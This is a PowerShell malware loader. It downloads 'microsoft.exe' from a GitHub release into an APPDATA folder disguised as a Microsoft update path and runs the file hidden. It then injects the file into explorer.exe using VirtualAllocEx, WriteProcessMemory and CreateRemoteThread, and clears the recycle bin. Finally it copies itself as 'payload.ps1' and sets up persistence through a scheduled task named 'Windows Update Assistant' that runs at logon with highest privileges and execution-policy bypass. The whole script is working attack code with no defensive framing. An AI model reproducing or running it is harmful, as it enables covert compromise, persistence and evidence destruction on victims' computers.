$repo = "BotSolo621/WLP"
$file = "microsoft.exe"
$targetProcess = "explorer"
$targetPath = "$env:APPDATA\Microsoft\Windows\UpdateAssistant\"
New-Item -ItemType Directory -Path $targetPath -Force -ErrorAction SilentlyContinue | Out-Null
$exePath = Join-Path -Path $targetPath -ChildPath $file
$versionFile = Join-Path -Path $targetPath -ChildPath "version.txt"
function Get-LatestRelease {
    try {
        $releases = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -ErrorAction Stop
        $latest = $releases[0]
        $asset = $latest.assets | Where-Object { $_.name -eq $file } | Select-Object -First 1
        return @{
            Version = $latest.tag_name
            Url     = $asset.browser_download_url
        }
    } catch {
        Write-Output "Failed to get latest release: $_"
        return $null
    }
}
function Get-CurrentVersion {
    if (Test-Path -Path $versionFile) {
        return (Get-Content -Path $versionFile -Raw).Trim()
    }
    Write-Output "No version file found"
    return $null
}
$latest = Get-LatestRelease
Write-Output "Latest version: $($latest.Version)"
$currentVersion = Get-CurrentVersion
Write-Output "Current version: $currentVersion"
if ($latest -and ($latest.Version -ne $currentVersion)) {
    Write-Output "Update available, stopping process..."
    Stop-Process -Name "microsoft" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1
    Write-Output "Downloading new version..."
    try {
        Invoke-WebRequest -Uri $latest.Url -OutFile $exePath -UseBasicParsing -ErrorAction Stop
        Set-Content -Path $versionFile -Value $latest.Version -Force
        Write-Output "Downloaded version $($latest.Version)"
    } catch {
        Write-Output "Download failed: $_"
        if (-not (Test-Path -Path $exePath)) { 
            Write-Output "No existing executable found, exiting"
            exit 
        }
        Write-Output "Using existing executable"
    }
}
function Invoke-ProcessInjection {
    param (
        [string]$ProcessName,
        [string]$DllPath
    )
    $existingType = [System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {
        $_.GetTypes() | Where-Object { $_.Name -eq "Injector" }
    }

    if ($existingType) {
        Write-Output "Type 'Injector' already exists, skipping type load"
    } else {
        $MethodDefinition = @"
using System;using System.Runtime.InteropServices;public class Injector{[DllImport("kernel32.dll")]public static extern IntPtr OpenProcess(int dwDesiredAccess,bool bInheritHandle,int dwProcessId);[DllImport("kernel32.dll",CharSet=CharSet.Auto)]public static extern IntPtr GetModuleHandle(string lpModuleName);[DllImport("kernel32",CharSet=CharSet.Ansi,ExactSpelling=true,SetLastError=true)]public static extern IntPtr GetProcAddress(IntPtr hModule,string procName);[DllImport("kernel32.dll",SetLastError=true,ExactSpelling=true)]public static extern IntPtr VirtualAllocEx(IntPtr hProcess,IntPtr lpAddress,uint dwSize,uint flAllocationType,uint flProtect);[DllImport("kernel32.dll",SetLastError=true)]public static extern bool WriteProcessMemory(IntPtr hProcess,IntPtr lpBaseAddress,byte[] lpBuffer,uint nSize,out UIntPtr lpNumberOfBytesWritten);[DllImport("kernel32.dll")]public static extern IntPtr CreateRemoteThread(IntPtr hProcess,IntPtr lpThreadAttributes,uint dwStackSize,IntPtr lpStartAddress,IntPtr lpParameter,uint dwCreationFlags,IntPtr lpThreadId);}
"@
        
        try {
            Add-Type -TypeDefinition $MethodDefinition -Language CSharp -ErrorAction Stop
        } catch {
            Write-Output "Failed to add type: $_"
            return $false
        }
    }

    $targetProc = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue | Select-Object -First 1
    if (-not $targetProc) { 
        Write-Output "Target process not found"
        return $false 
    }

    $hProcess = [Injector]::OpenProcess(0x1F0FFF,$false,$targetProc.Id)
    if ($hProcess -eq [IntPtr]::Zero) { 
        Write-Output "Failed to open process"
        return $false 
    }
    try {
        $dllBytes = [System.IO.File]::ReadAllBytes($DllPath)
        $size = $dllBytes.Length
        $allocAddr = [Injector]::VirtualAllocEx($hProcess,[IntPtr]::Zero,$size,0x3000,0x40)
        if ($allocAddr -eq [IntPtr]::Zero) { 
            Write-Output "Failed to allocate memory"
            return $false 
        }

        $bytesWritten = [UIntPtr]::Zero
        $result = [Injector]::WriteProcessMemory($hProcess,$allocAddr,$dllBytes,$size,[ref]$bytesWritten)
        if (-not $result) {
            Write-Output "Failed to write memory"
            return $false
        }

        $hKernel32 = [Injector]::GetModuleHandle("kernel32.dll")
        $loadLibAddr = [Injector]::GetProcAddress($hKernel32,"LoadLibraryA")
        $hThread = [Injector]::CreateRemoteThread($hProcess,[IntPtr]::Zero,0,$loadLibAddr,$allocAddr,0,[IntPtr]::Zero)
        if ($hThread -eq [IntPtr]::Zero) { 
            Write-Output "Failed to create remote thread"
            return $false 
        }

        Write-Output "Injection successful"
        return $true
    } finally {
        [System.Runtime.InteropServices.Marshal]::Release($hProcess)
    }
}
function Clear-RecycleBin {
    try {
        $shell = New-Object -ComObject Shell.Application
        $shell.Namespace(0xA).Items()|ForEach-Object{Remove-Item $_.Path -Force -Recurse -ErrorAction SilentlyContinue}
        Write-Output "Recycle bin cleared"
    } catch {
        Write-Output "Failed to clear recycle bin: $_"
    }
}
if (Test-Path -Path $exePath) {
    Write-Output "Starting executable..."
    Start-Process -FilePath $exePath -WindowStyle Hidden
    Write-Output "Attempting injection..."
    Invoke-ProcessInjection -ProcessName $targetProcess -DllPath $exePath
    Write-Output "Clearing recycle bin..."
    Clear-RecycleBin
} else {
    Write-Output "Executable not found at $exePath"
}
$taskName = "Windows Update Assistant"
$scriptCopyPath = Join-Path $targetPath "payload.ps1"

if ($MyInvocation.MyCommand.Path) {
    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptCopyPath -Force
    Write-Output "Script copied to $scriptCopyPath"
}
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptCopyPath`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -DontStopOnIdleEnd -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
$principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force -ErrorAction SilentlyContinue
Write-Output "Persistence task created"
